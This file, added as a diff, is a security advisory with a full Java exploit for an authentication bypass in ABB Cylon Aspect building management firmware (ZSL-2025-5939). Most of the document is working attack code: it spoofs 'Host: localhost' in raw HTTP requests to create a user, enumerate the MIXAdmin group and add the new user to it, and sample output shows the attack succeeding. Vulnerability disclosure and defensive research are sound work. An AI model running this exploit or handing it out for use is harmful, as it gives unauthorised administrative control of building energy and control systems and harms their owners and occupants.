@@ -1,0 +1,283 @@
+/*
+
+
+ABB Cylon Aspect 3.08.03 (MIX->UserManager) Auth Bypass Create MIXAdmin
+
+
+Vendor: ABB Ltd.
+Product web page: https://www.global.abb
+Affected version: NEXUS Series, MATRIX-2 Series, ASPECT-Enterprise, ASPECT-Studio
+                  Firmware: <=3.08.03
+
+Summary: ASPECT is an award-winning scalable building energy management
+and control solution designed to allow users seamless access to their
+building data through standard building protocols including smart devices.
+
+Desc: ABB Cylon Aspect BMS/BAS is vulnerable to a critical flaw in the
+AuthenticatedHttpServlet within its application server, enabling
+remote attackers to bypass authentication by setting the Host:
+127.0.0.1 header. This deceives the server into processing requests
+as if they originate from localhost, granting unauthorized access
+to privileged operations. Specifically, this vulnerability impacts
+the UserManager and GroupManager servlets, allowing unauthenticated
+attackers to create and remove users and groups without credentials.
+The flaw stems from the servlet’s automatic authorization of localhost
+requests as the aamuser account, exposing these sensitive functions
+to both local and remote exploitation. By leveraging this bypass,
+attackers can manipulate user and group configurations, potentially
+escalating privileges or disrupting system access controls.
+
+--------------------------------------------------------------------------
+$ java -jar MixExploit.jar 192.168.73.31 testingus 123456 MIXAdmin
+[+] User 'testingus' added successfully.
+[+] Found MIXAdmin users: [aamuser, thricer, burj, redbull]
+[+] User 'testingus' added to MIXAdmin.
+[+] User 'testingus' found in UserManager.
+[+] User 'testingus' is in MIXAdmin group.
+--------------------------------------------------------------------------
+
+Tested on: GNU/Linux 3.15.10 (armv7l)
+           GNU/Linux 3.10.0 (x86_64)
+           GNU/Linux 2.6.32 (x86_64)
+           Intel(R) Atom(TM) Processor E3930 @ 1.30GHz
+           Intel(R) Xeon(R) Silver 4208 CPU @ 2.10GHz
+           PHP/7.3.11
+           PHP/5.6.30
+           PHP/5.4.16
+           PHP/4.4.8
+           PHP/5.3.3
+           AspectFT Automation Application Server
+           lighttpd/1.4.32
+           lighttpd/1.4.18
+           Apache/2.2.15 (CentOS)
+           OpenJDK Runtime Environment (rhel-2.6.22.1.-x86_64)
+           OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)
+           ErgoTech MIX Deployment Server 2.0.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+Macedonian Information Security Research and Development Laboratory
+Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+
+
+Advisory ID: ZSL-2025-5939
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5939.php
+
+
+21.04.2024
+
+
+*/
+
+
+import java.io.*;
+import java.net.*;
+import java.util.*;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+public class MixExploit {
+    private static final String USER_MANAGER_URL = "/servlets/UserManager";
+    private static final String GROUP_MANAGER_URL = "/servlets/GroupManager?selectedGroup=MIXAdmin";
+    private static final int PORT = 7226;
+
+    public static void main(String[] args) {
+        if (args.length != 4) {
+            printUsage();
+            return;
+        }
+
+        String ip = args[0];
+        String newUser = args[1];
+        String password = args[2];
+        String group = args[3];
+
+        try {
+            if (!checkServerAndUser(ip, newUser)) {
+                System.out.println("[-] Aborting: Either server is not AspectFT or user '" + newUser + "' already exists.");
+                return;
+            }
+
+            addNewUser(ip, newUser, password);
+            System.out.println("[+] User '" + newUser + "' added successfully.");
+
+            List<String> mixAdminUsers = enumerateUsers(ip);
+            System.out.println("[+] Found MIXAdmin users: " + mixAdminUsers);
+
+            addUsersToGroup(ip, mixAdminUsers, newUser, group);
+            System.out.println("[+] User '" + newUser + "' added to " + group + ".");
+
+            Thread.sleep(3000);
+
+            verifyUserAdded(ip, newUser);
+
+        } catch (IOException e) {
+            System.out.println("[-] Error: " + e.getMessage());
+        } catch (InterruptedException e) {
+            System.out.println("[-] Sleep interrupted: " + e.getMessage());
+        }
+    }
+
+    private static void printUsage() {
+        System.out.println("\n");
+        System.out.println("                P   R   O   J   E   C   T");
+        System.out.println("");
+        System.out.println("                        .|");
+        System.out.println("                        | |");
+        System.out.println("                        |'|            ._____");
+        System.out.println("                ___    |  |            |.   |' .---\"|");
+        System.out.println("        _    .-'   '-. |  |     .--'|  ||   | _|    |");
+        System.out.println("     .-'|  _.|  |    ||   '-__  |   |  |    ||      |");
+        System.out.println("     |' | |.    |    ||       | |   |  |    ||      |");
+        System.out.println("  ___|  '-'     '    \"\"       '-'   '-.'    '`      |___");
+        System.out.println("░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░  ");
+        System.out.println("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ");
+        System.out.println("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ");
+        System.out.println("░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ");
+        System.out.println("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ");
+        System.out.println("░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ");
+        System.out.println("░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░");
+        System.out.println("         ░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░ ");
+        System.out.println("         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░");
+        System.out.println("         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░ ");
+        System.out.println("         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░");
+        System.out.println("         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░");
+        System.out.println("         ░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░");
+        System.out.println("         ░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░");
+        System.out.println("\n");
+        System.out.println("Usage: java -jar MixExploit.jar <IP> <USER> <PASS> <GROUP>");
+        System.out.println("Example: java -jar MixExploit.jar 192.168.73.31 testingus 123456 MIXAdmin");
+    }
+
+    private static boolean checkServerAndUser(String ip, String newUser) throws IOException {
+        String response = sendGetRequest(ip, USER_MANAGER_URL);
+
+        if (!response.contains("Server:AspectFT Automation Application Server")) {
+            System.out.println("[-] Server is not AspectFT Automation Application Server.");
+            return false;
+        }
+
+        if (response.contains("value='" + newUser + "'")) {
+            System.out.println("[-] User '" + newUser + "' already exists in UserManager.");
+            return false;
+        }
+
+        return true;
+    }
+
+    private static void addNewUser(String ip, String username, String password) throws IOException {
+        String url = USER_MANAGER_URL;
+        String postData = "newuser=" + URLEncoder.encode(username, "UTF-8") +
+                "&password=" + URLEncoder.encode(password, "UTF-8") +
+                "&passwordConfirm=" + URLEncoder.encode(password, "UTF-8") +
+                "&Insert=Add";
+
+        sendPostRequest(ip, url, postData);
+    }
+
+    private static List<String> enumerateUsers(String ip) throws IOException {
+        String response = sendGetRequest(ip, USER_MANAGER_URL);
+
+        List<String> mixAdminUsers = new ArrayList<>();
+        Pattern userPattern = Pattern.compile("<tr><td class=\"data\">.*?value='([^']+)'.*?<td class=\"data\">(.*?)</td>", Pattern.DOTALL);
+        Pattern groupPattern = Pattern.compile("GroupManager\\?selectedGroup=\\s*MIXAdmin");
+
+        Matcher userMatcher = userPattern.matcher(response);
+        while (userMatcher.find()) {
+            String user = userMatcher.group(1);
+            String groups = userMatcher.group(2);
+            if (groupPattern.matcher(groups).find()) {
+                mixAdminUsers.add(user);
+            }
+        }
+
+        return mixAdminUsers;
+    }
+
+    private static void addUsersToGroup(String ip, List<String> existingUsers, String newUser, String group) throws IOException {
+        String url = GROUP_MANAGER_URL;
+
+        String preventiveRight = new StringBuilder().append(existingUsers).append(",").append(newUser).toString();
+
+        StringBuilder newRight = new StringBuilder();
+        for (String user : existingUsers) {
+            newRight.append(URLEncoder.encode(user, "UTF-8")).append(",");
+        }
+        newRight.append(URLEncoder.encode(newUser, "UTF-8"));
+
+        String postData = "groupName=" + URLEncoder.encode(group, "UTF-8") +
+                "&removedLeft=" + URLEncoder.encode(newUser, "UTF-8") +
+                "&removedRight=" + URLEncoder.encode("", "UTF-8") +
+                "&addedLeft=" + URLEncoder.encode("", "UTF-8") +
+                "&addedRight=" + URLEncoder.encode(newUser, "UTF-8") +
+                "&newLeft=" + URLEncoder.encode("", "UTF-8") +
+                "&newRight=" + newRight.toString() +
+                "&EditGroup=Save";
+
+        sendPostRequest(ip, url, postData);
+    }
+
+    private static void verifyUserAdded(String ip, String username) throws IOException {
+        String response = sendGetRequest(ip, USER_MANAGER_URL);
+
+        if (response.contains("value='" + username + "'")) {
+            System.out.println("[+] User '" + username + "' found in UserManager.");
+            if (response.contains("MIXAdmin")) {
+                System.out.println("[+] User '" + username + "' is in MIXAdmin group.");
+            } else {
+                System.out.println("[-] User '" + username + "' not in MIXAdmin group.");
+            }
+        } else {
+            System.out.println("[-] User '" + username + "' not found in UserManager.");
+        }
+    }
+
+    private static String sendPostRequest(String ip, String path, String postData) throws IOException {
+        Socket socket = new Socket(ip, PORT);
+        OutputStream out = socket.getOutputStream();
+        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+
+        String request = "POST " + path + " HTTP/1.1\r\n" +
+                "Host: localhost\r\n" +
+                "Content-Type: application/x-www-form-urlencoded\r\n" +
+                "Content-Length: " + postData.length() + "\r\n" +
+                "Connection: close\r\n" +
+                "\r\n" +
+                postData;
+
+        out.write(request.getBytes("UTF-8"));
+        out.flush();
+
+        StringBuilder response = new StringBuilder();
+        String line;
+        while ((line = in.readLine()) != null) {
+            response.append(line).append("\n");
+        }
+
+        socket.close();
+        return response.toString();
+    }
+
+    private static String sendGetRequest(String ip, String path) throws IOException {
+        Socket socket = new Socket(ip, PORT);
+        OutputStream out = socket.getOutputStream();
+        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+
+        String request = "GET " + path + " HTTP/1.1\r\n" +
+                "Host: localhost\r\n" +
+                "Connection: close\r\n" +
+                "\r\n";
+
+        out.write(request.getBytes("UTF-8"));
+        out.flush();
+
+        StringBuilder response = new StringBuilder();
+        String line;
+        while ((line = in.readLine()) != null) {
+            response.append(line).append("\n");
+        }
+
+        socket.close();
+        return response.toString();
+    }
+}
